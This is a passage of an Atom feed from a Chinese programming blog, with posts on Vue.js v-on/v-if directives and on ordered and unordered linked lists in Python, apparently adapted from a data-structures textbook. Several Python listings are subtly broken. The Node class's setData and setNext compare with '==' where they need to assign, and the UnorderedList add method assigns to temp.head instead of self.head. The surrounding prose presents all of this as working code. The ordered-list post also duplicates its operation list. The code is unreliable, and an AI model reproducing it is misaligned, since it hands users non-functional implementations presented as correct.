      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Vue.js的数据</title>
    <link href="http://adamzeng.site/2017/11/02/Vue-js%E7%9A%84%E6%95%B0%E6%8D%AE/"/>
    <id>http://adamzeng.site/2017/11/02/Vue-js的数据/</id>
    <published>2017-11-02T14:08:40.000Z</published>
    <updated>2017-11-02T15:38:13.000Z</updated>
    
    <content type="html"><![CDATA[<p>v-on click:点击某个地方，让数据发生变动。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">v-on:click</span>=<span class="string">"doSomething"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure><p>使用v-if,v-else实现屏蔽</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"comment"</span> <span class="attr">v-if</span>=<span class="string">"false"</span>&gt;</span></div><div class="line">  </div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else</span> <span class="attr">class</span>=<span class="string">"comment"</span>&gt;</span></div><div class="line">  </div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;v-on click:点击某个地方，让数据发生变动。&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td 
      
    
    </summary>
    
      <category term="Vue.js" scheme="http://adamzeng.site/categories/Vue-js/"/>
    
    
      <category term="Vue.js" scheme="http://adamzeng.site/tags/Vue-js/"/>
    
  </entry>
  
  <entry>
    <title>有序列表</title>
    <link href="http://adamzeng.site/2017/10/30/%E6%9C%89%E5%BA%8F%E5%88%97%E8%A1%A8/"/>
    <id>http://adamzeng.site/2017/10/30/有序列表/</id>
    <published>2017-10-30T14:15:17.000Z</published>
    <updated>2017-10-30T14:52:32.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="有序列表抽象数据结构"><a href="#有序列表抽象数据结构" class="headerlink" title="有序列表抽象数据结构"></a>有序列表抽象数据结构</h1><p>我们现在将考虑一种称为有序列表的列表类型。例如，如果上面所示的整数列表是有序列表（升序），则它可以写为<code>17,26,31,54,77和93</code>。由于17是最小项，它占据第一位置。同样，由于93是最大的，它占据最后的位置。<a id="more"></a></p><p>有序列表的结构是项的集合，其中每个项保存基于项的一些潜在特性的相对位置。排序通常是升序或降序，并且我们假设列表项具有已经定义的有意义的比较运算。许多有序列表操作与无序列表的操作相同。</p><ul><li>OrderedList() 创建一个新的空列表。它不需要参数，并返回一个空列表。</li><li>add(item) 向列表中添加一个新项。它需要 item 作为参数，并不返回任何内容。假定该 item 不在列表中。</li><li>remove(item) 从列表中删除该项。它需要 item 作为参数并修改列表。假设项存在于列表中。</li><li>search(item) 搜索列表中的项目。它需要 item 作为参数，并返回一个布尔值。</li><li>isEmpty() 检查列表是否为空。它不需要参数，并返回布尔值。</li><li>size（）返回列表中的项数。它不需要参数，并返回一个整数。</li><li>index(item) 返回项在列表中的位置。它需要 item 作为参数并返回索引。假定该项在列表中。</li><li>pop() 删除并返回列表中的最后一个项。假设该列表至少有一个项。</li><li>pop(pos) 删除并返回位置 pos 处的项。它需要 pos 作为参数并返回项。假定该项在列表中。</li></ul><p>为了实现有序列表，我们必须记住项的相对位置是基于一些潜在的特性。上面给出的整数的有序列表</p><ul><li>OrderedList() 创建一个新的空列表。它不需要参数，并返回一个空列表。</li><li>add(item) 向列表中添加一个新项。它需要 item 作为参数，并不返回任何内容。假定该 item 不在列表中。</li><li>remove(item) 从列表中删除该项。它需要 item 作为参数并修改列表。假设项存在于列表中。</li><li>search(item) 搜索列表中的项目。它需要 item 作为参数，并返回一个布尔值。</li><li>isEmpty() 检查列表是否为空。它不需要参数，并返回布尔值。</li><li>size（）返回列表中的项数。它不需要参数，并返回一个整数。</li><li>index(item) 返回项在列表中的位置。它需要 item 作为参数并返回索引。假定该项在列表中。</li><li>pop() 删除并返回列表中的最后一个项。假设该列表至少有一个项。</li><li>pop(pos) 删除并返回位置 pos 处的项。它需要 pos 作为参数并返回项。假定该项在列表中。</li></ul><h1 id="实现有序列表"><a href="#实现有序列表" class="headerlink" title="实现有序列表"></a>实现有序列表</h1><p>为了实现有序列表，我们必须记住项的相对位置是基于一些潜在的特性。上面给出的整数的有序列表<code>17,26,31,54,77</code> 和 <code>93</code> 可以由 Figure 15 所示的链接结构表示。节点和链接结构表示项的相对位置。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.23.%E5%AE%9E%E7%8E%B0%E6%9C%89%E5%BA%8F%E5%88%97%E8%A1%A8/assets/3.23.%E5%AE%9E%E7%8E%B0%E6%9C%89%E5%BA%8F%E5%88%97%E8%A1%A8.figure15.png" alt="image"></p><p><em>Figure 15</em></p><p>为了实现OrderedList类，我们将使用与前面看到的无序列表相同的技术。再次，head的引用为None表示空链表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderedList</span>:</span></div><div class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">    self.head=<span class="keyword">None</span></div></pre></td></tr></table></figure><p><em>Listing 8</em></p><p>当我们考虑有序列表的操作时，我们应该注意，<code>isEmpty</code> 和<code>size</code> 方法可以与无序列表一样实现，因为它们只处理链表中的节点数量，而不考虑实际项值。同样，<code>remove</code> 方法将正常工作，因为我们仍然需要找到该项，然后删除它。剩下的两个方法，<code>search</code> 和 <code>add</code>，将需要一些修改。</p><p>搜索无序列表需要我们一次遍历一个节点，直到找到我们正在寻找的节点或者没找到节点（None）。事实证明，相同的方法在有序列表也有效。然而，在项不在链表中的情况下，我们可以利用该顺序来尽快停止搜索。</p><p>例如，Figure 16 展示了有序链表搜索值 45 。从链表的头部开始遍历，首先与 <code>17</code> 进行比较。由于 <code>17</code> 不是我们正在寻找的项，移动到下一个节点 <code>26</code> 。再次，这不是我们想要的，继续到 <code>31</code>，然后再到 <code>54</code>。在这一点上，有一些不同。由于 <code>54</code> 不是我们正在寻找的项，我们以前的方法是继续向前迭代。然而，由于这是有序列表，一旦节点中的值变得大于我们正在搜索的项，搜索就可以停止并返回 False 。该项不可能存在于后面的链表中。 </p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.23.%E5%AE%9E%E7%8E%B0%E6%9C%89%E5%BA%8F%E5%88%97%E8%A1%A8/assets/3.23.%E5%AE%9E%E7%8E%B0%E6%9C%89%E5%BA%8F%E5%88%97%E8%A1%A8.figure16.png" alt="image"></p><p><em>Figure 16</em></p><p>Listing 9 展示了完整的搜索方法。通过添加另一个布尔变量 <code>stop</code> 并将其初始化为 <code>False</code>（第4行），很容易合并上述新条件。 当 <code>stop</code> 是<code>False</code>（不停止）时，我们可以继续在列表中前进（第5行）。如果发现任何节点包含大于我们正在寻找的项的数据，我们将 <code>stop</code> 设置为 <code>True</code>（第9-10行）。其余行与无序列表搜索相同。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderedList</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.head=<span class="keyword">None</span></div><div class="line">        </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(self,item)</span>:</span></div><div class="line">        current=self.head</div><div class="line">        found=<span class="keyword">False</span></div><div class="line">        stop=<span class="keyword">False</span></div><div class="line">        <span class="keyword">while</span> current!=<span class="keyword">None</span> <span class="keyword">and</span> <span class="keyword">not</span> found <span class="keyword">and</span> <span class="keyword">not</span> stop:</div><div class="line">            <span class="keyword">if</span> current.getData()==item:</div><div class="line">                found=<span class="keyword">True</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">if</span> current.getData()&gt;item:</div><div class="line">                    stop=<span class="keyword">True</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    current=current.getNext()</div><div class="line">                    </div><div class="line">        <span class="keyword">return</span> found</div></pre></td></tr></table></figure><p><em>Listing 9</em></p><p>最重要的需要修改的方法是add。回想一下，对于无序列表，add方法可以简单地将新节点放在链表的头部。这是最简单的访问点。不幸的是，这将不再适用于有序列表。需要在现在的有序列表中查找新项所属的特定位置。</p><p>假设我们有由假设我们有由 <code>17,26,54,77</code> 和 <code>93</code> 组成的有序列表，并且我们要添加值<code>31</code> 。 <code>add</code> 方法必须确定新项属于 <code>26</code> 到 <code>54</code> 之间。Figure 17 展示了我们需要的设置。正如我们前面解释的，我们需要遍历链表，寻找添加新节点的地方。我们知道，当我们迭代完节点（ <code>current</code> 变为 None）或 <code>current</code> 节点的值变得大于我们希望添加的项时，我们就找到了该位置。在我们的例子中，看到值 <code>54</code> 我们停止迭代。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.23.%E5%AE%9E%E7%8E%B0%E6%9C%89%E5%BA%8F%E5%88%97%E8%A1%A8/assets/3.23.%E5%AE%9E%E7%8E%B0%E6%9C%89%E5%BA%8F%E5%88%97%E8%A1%A8.figure17.png" alt="image"></p><p><em>Figure 17</em></p><p>正如我们看到的无序列表，有必要有一个额外的引用，再次称为 <code>previous</code>，因为 <code>current</code> 不会提供对修改的节点的访问。 Listing 10 展示了完整的<code>add</code> 方法。 行 2-3 设置两个外部引用，行 9-10 允许 <code>previous</code> 每次通过迭代跟随 <code>current</code> 节点后面 。 条件（行5）允许迭代继续，只要有更多的节点，并且当前节点中的值不大于该项。 在任一种情况下，当迭代失败时，我们找到了新节点的位置。</p><p>该方法的其余部分完成 Figure17 所示的两步过程。一旦为该项创建了新节点，剩下的唯一问题是新节点是否将被添加在链表的开始处或某个中间位置。再次，<code>previous == None</code>（第13行）可以用来提供答案。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self,item)</span>:</span></div><div class="line">    current=self.head</div><div class="line">    previous=<span class="keyword">None</span></div><div class="line">    stop=<span class="keyword">False</span></div><div class="line">    <span class="keyword">while</span> current!=<span class="keyword">None</span> <span class="keyword">and</span> <span class="keyword">not</span> stop:</div><div class="line">        <span class="keyword">if</span> current.getData()&gt;item:</div><div class="line">            stop=<span class="keyword">True</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            previous=current</div><div class="line">            current=current.getNext()</div><div class="line"></div><div class="line">    temp=Node(item)</div><div class="line">    <span class="keyword">if</span> previous==<span class="keyword">None</span>:</div><div class="line">        temp.setNext(self.head)</div><div class="line">        self.head=temp</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        temp.setNext(current)</div><div class="line">        previous.setNext(temp)</div></pre></td></tr></table></figure><p><em>Listing 10</em></p><h3 id="3-23-1-链表分析"><a href="#3-23-1-链表分析" class="headerlink" title="3.23.1.链表分析"></a>3.23.1.链表分析</h3><p>为了分析链表操作的复杂性，我们需要考虑它们是否需要遍历。考虑具有 n 个节点的链表。 <code>isEmpty</code> 方法是 O(1)，因为它需要一个步骤来检查头的引用为 <code>None</code>。另一方面，<code>size</code> 将总是需要 n 个步骤，因为不从头到尾地移动没法知道有多少节点在链表中。因此，长度为 O(n)。将项添加到无序列表始终是O(1)，因为我们只是将新节点放置在链表的头部。但是，搜索和删除，以及添加有序列表，都需要遍历过程。虽然平均他们可能只需要遍历节点的一半，这些方法都是 O(n)，因为在最坏的情况下，都将处理列表中的每个节点。</p><p>你可能还注意到此实现的性能与早前针对 Python 列表给出的实际性能不同。这表明链表不是 Python 列表的实现方式。 Python 列表的实际实现基于数组的概念。我们在第 8 章中更详细地讨论这个问题。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;有序列表抽象数据结构&quot;&gt;&lt;a href=&quot;#有序列表抽象数据结构&quot; class=&quot;headerlink&quot; title=&quot;有序列表抽象数据结构&quot;&gt;&lt;/a&gt;有序列表抽象数据结构&lt;/h1&gt;&lt;p&gt;我们现在将考虑一种称为有序列表的列表类型。例如，如果上面所示的整数列表是有序列表（升序），则它可以写为&lt;code&gt;17,26,31,54,77和93&lt;/code&gt;。由于17是最小项，它占据第一位置。同样，由于93是最大的，它占据最后的位置。
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>列表</title>
    <link href="http://adamzeng.site/2017/10/30/%E5%88%97%E8%A1%A8/"/>
    <id>http://adamzeng.site/2017/10/30/列表/</id>
    <published>2017-10-30T02:18:07.000Z</published>
    <updated>2017-10-30T14:12:58.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><p>在对基本数据结构的讨论中，我们使用Python列表来实现所呈现的抽象数据类型。列表是一个强大但简单的收集机制，为程序员提供了各种各样的操作。然而，不是所有的编程语言都包括列表集合、在这些情况下，列表的概念必须由程序员实现。<a id="more"></a></p><p>列表是项的集合，其中每个项保持相对其他项的相对位置。更具体地，我们将这种类型的列表称为无序列表。我们可以将列表视为具有第一项，第二项，第三项等等。我们还可以引用列表的开头（第一个项）或列表的结尾）最后一个项）。为了简单起见，我们假设列表不能包含重复项。</p><p>例如，整数54，26，93，17，77和31的集合可以表示分数的简单无序列表。请注意，我们将它们用逗号分隔，这是列表结构的常用方式。当然，Python会显示这个列表为[54,26,93,17,77,31]。</p><h1 id="实现无序列表抽象数据类型"><a href="#实现无序列表抽象数据类型" class="headerlink" title="实现无序列表抽象数据类型"></a>实现无序列表抽象数据类型</h1><p>如上所述，无序列表的结构是项的集合，其中每个项保持相对于其他项的相对位置。下面给出了一些可能的无序列表操作。</p><ul><li>List()创建一个新的空列表。他不需要参数，并返回一个空列表。</li><li>add(item)向列表中添加一个新项。它需要item作为参数，并不返回任何内容。假定该item不在列表中。</li><li>remove(item)从列表中删除该项。它需要 item 作为参数并修改列表。假设项存在于列表中。</li><li>search(item) 搜索列表中的项目。它需要 item 作为参数，并返回一个布尔值。</li><li>isEmpty() 检查列表是否为空。它不需要参数，并返回布尔值。</li><li>size（）返回列表中的项数。它不需要参数，并返回一个整数。</li><li>append(item) 将一个新项添加到列表的末尾，使其成为集合中的最后一项。它需要 item 作为参数，并不返回任何内容。假定该项不在列表中。</li><li>index(item) 返回项在列表中的位置。它需要 item 作为参数并返回索引。假定该项在列表中。</li><li>insert(pos，item) 在位置 pos 处向列表中添加一个新项。它需要 item 作为参数并不返回任何内容。假设该项不在列表中，并且有足够的现有项使其有 pos 的位置。</li><li>pop() 删除并返回列表中的最后一个项。假设该列表至少有一个项。</li><li>pop(pos) 删除并返回位置 pos 处的项。它需要 pos 作为参数并返回项。假定该项在列表中。</li></ul><h1 id="实现无序列表：链表"><a href="#实现无序列表：链表" class="headerlink" title="实现无序列表：链表"></a>实现无序列表：链表</h1><p>为了实现无序列表，我们将构造通常所知的链表。回想一下，我们需要确保我们可以保持项的相对定位。然而，没有要求我们维持在连续存储器中的定位。例如，考虑Figure 1中所示的项的集合。看来这些值已被随机放置。如果我们可以在每个项中保持一些明确的信息，即下一个项的位置(参见Figure 2)，则每个项的相对位置可以通过简单地从一个项到下一个项的链接来表示。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure1.png" alt="image"></p><p><em>Figure 1</em></p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure2.png" alt="image"></p><p><em>Figure 2</em></p><p>要注意，必须明确地指定链表的第一项的位置。一旦我们知道第一个项在哪里，第一个项目可以告诉我们第二个是什么，等等。外部引用通常被称为链表的头。类似地，最后一个项需要知道没有下一个项。</p><h3 id="Node类"><a href="#Node类" class="headerlink" title="Node类"></a>Node类</h3><p>链表实现的基本构造块是节点。每个节点对象必须至少保存两个信息。首先，节点必须包含列表项本身。我们将这个称为节点的数据字段。此外，每个节点必须保存对下一个节点的引用。Listing 1展示了Python实现。要构造一个节点，需要提供该节点的初始数据值。下面的赋值语句将产生一个包含值93的节点对象(见Figure 3)。应该注意，我们通常会如Figure 4 所示表示一个节点对象。Node类还包括访问，修改数据和访问下一个引用的常用方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,initdata)</span>:</span></div><div class="line">        self.data=initdata</div><div class="line">        self.next=<span class="keyword">None</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getData</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.data</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getNext</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.next</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setData</span><span class="params">(self,newdata)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.data==newdata</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setNext</span><span class="params">(self,newnext)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.next==newnext</div><div class="line"></div><div class="line"></div><div class="line">temp=Node(<span class="number">93</span>)</div><div class="line">print(temp.getData())</div></pre></td></tr></table></figure><p>Python引用值None类和链表本身发挥重要作用。引用None代表没有下一个节点。请注意在构造函数中，最初创建的节点next被设置为None，有时这被称为接地节点，因此我们使用标准接地符号表示对None的引用。将None显式的分配给初始下一个引用值是一个好主意。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure3.png" alt="image"></p><p><em>Figure 3</em></p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure4.png" alt="image"></p><p><em>Figure 4</em></p><p>###Unordered List类</p><p>如上所述，无序列表将从一组节点构建，每个节点通过显式引用链接到下一个节点。只要我们知道在哪里找到第一个节点（包含第一个项），之后的每个项可以通过连续跟随下一个链接找到。考虑到这一点，UnorderedList类必须保持对第一个节点的引用。Listing 2显示了构造函数。注意，每一个链表对象将维护对链表头部的单个引用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">UnorderedList</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.head=<span class="keyword">None</span></div></pre></td></tr></table></figure><p><em>Listing 2</em></p><p>我们构建一个空的链表。赋值语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>mylist = UnorderedList()</div></pre></td></tr></table></figure><p>创建如Figure5所示的链表。正如我们在Node类中讨论的，特殊引用None将再次用于表示链表的头部不引用任何内容。最终，先前给出的示例列表如Figure 6所示的链接列表表示。链表的头指代列表的第一项的第一节点。反过来，该节点保存对下一个节点（下一个项）的引用，等等。重要的是注意链表类本身不包含任何节点对象。相反，它只包含对链接结构中第一个节点的单个引用。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure5.png" alt="image"></p><p><em>Figure 5</em></p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure6.png" alt="image"></p><p><em>Figure 6</em></p><p>Listing 3中所示的isEmpty方法只是检查链表头是否是None的引用。布尔表达式self.head==None的结果只有在链表中没有节点时才为真。由于新链表为空，因此构造函数和空检查必须彼此一致。这显示了使用引用None来表示链接结构的 <code>end</code>的优点。在Python中，None可以与任何引用进行比较。如果它们都指向相同的对象，则两个引用是相等的。我们将在其他方法中经常使用它。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">isEmpty</span><span class="params">(self)</span>:</span></div><div class="line">    <span class="keyword">return</span> self.head==<span class="keyword">None</span></div></pre></td></tr></table></figure><p><em>Listing 3</em></p><p>那么，我们如何将项加入我们的链表？我们需要实现add方法。然而，在我们做这一点之前，我们需要解决在链表中哪个位置放置新项的重要问题。由于该链表是无序的，所以新项相对于已经在列表中的其他项的特定位置并不重要。新项可以在任何位置。考虑到这一点，将新项防在最简单的位置是有意义的。</p><p>回想一下，链表结构置位我们提供了一个入口点，即链表的头部。所有其他节点只能通过访问第一个节点，然后跟随下一个链接到达。这意味着添加新节点的最简单的地方就在链表的头部。换句话说，我们将新项作为链表的第一项，现有项将需要链接到这个新项后。</p><p>Figure 6展示了链表调用多次add函数的操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>mylist.add(<span class="number">31</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>mylist.add(<span class="number">77</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>mylist.add(<span class="number">17</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>mylist.add(<span class="number">93</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>mylist.add(<span class="number">26</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>mylist.add(<span class="number">54</span>)</div></pre></td></tr></table></figure><p><em>Figure 6</em></p><p>因为31是添加到链表的第一个项，它最终将是链表中的最后一个节点，因为每个其他项在其前面添加。此外，由于 54 是添加的最后一项，它将成为链表的第一个节点中的数据值。</p><p>add 方法如 Listing 4 所示。链表的每项必须驻留在节点对象中。第 2 行创建一个新节点并将该项作为其数据。现在我们必须通过将新节点链接到现有结构中来完成该过程。这需要两个步骤，如 Figure 7 所示。步骤1（行3）更改新节点的下一个引用以引用旧链表的第一个节点。现在，链表的其余部分已经正确地附加到新节点，我们可以修改链表的头以引用新节点。第 4 行中的赋值语句设置列表的头。</p><p>上述两个步骤的顺序非常重要。如果第 3 行和第 4 行的顺序颠倒，会发生什么？如果链表头部的修改首先发生，则结果可以在 Figure 8 中看到。由于 head 是链表节点的唯一外部引用，所有原始节点都将丢失并且不能再被访问。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">UnorderedList</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.head=<span class="keyword">None</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isEmpty</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.head == <span class="keyword">None</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self,item)</span>:</span></div><div class="line">        temp=Node(item)</div><div class="line">        temp.setNext(self.head)</div><div class="line">        temp.head=temp</div></pre></td></tr></table></figure><p><em>Listing 4</em></p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure7.png" alt="image"></p><p><em>Figure 7</em> </p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure8.png" alt="image"></p><p><em>Figure 8</em></p><p>我们将实现的下面的方法 - <code>size</code>，<code>search</code> 和 <code>remove</code> - 都基于一种称为链表遍历的技术。遍历是指系统地访问每个节点的过程。为此，我们使用从链表中第一个节点开始的外部引用。当我们访问每个节点时，我们通过“遍历”下一个引用来移动到对下一个节点的引用。</p><p>要实现 <code>size</code> 方法，我们需要遍历链表并对节点数计数。Listing 5 展示了用于计算列表中节点数的 Python 代码。外部引用称为 <code>current</code>，并在第二行被初始化到链表的头部。开始的时候，我们没有看到任何节点，所以计数设置为 0 。第 4-6 行实际上实现了遍历。只要当前引用没到链表的结束位置（None），我们通过第 6 